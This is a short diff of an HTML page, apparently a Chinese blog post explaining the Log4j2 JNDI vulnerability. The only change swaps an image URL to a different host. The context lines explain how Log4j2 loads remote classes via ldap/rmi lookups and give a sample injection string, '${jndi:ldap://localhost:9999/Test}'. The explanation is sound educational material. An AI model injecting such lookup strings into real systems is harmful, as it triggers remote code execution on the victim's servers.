@@ -394,7 +394,7 @@
 <ul>
 <li>Log4j2默认支持解析ldap/rmi协议（只要打印的日志中包括ldap/rmi协议即可），并会通过名称从ldap服务端其获取对应的Class文件，并使用ClassLoader在本地加载Ldap服务端返回的Class类。</li>
 <li>这就为攻击者提供了攻击途径，攻击者可以在界面传入一个包含恶意内容（会提供一个恶意的Class文件）的ldap协议内容（如：恶意内容${jndi:ldap://localhost:9999/Test}恶意内容），该内容传递到后端被log4j2打印出来，就会触发恶意的Class的加载执行（可执行任意后台指令），从而达到攻击的目的。</li>
-<li><img loading="lazy" src="https://img2022.cnblogs.com/blog/2806024/202205/2806024-20220514160157268-2037626840.png" alt="img"  />
+<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image2806024-20220514160157268-2037626840.png" alt="img"  />
 </li>
 </ul>
 </li>
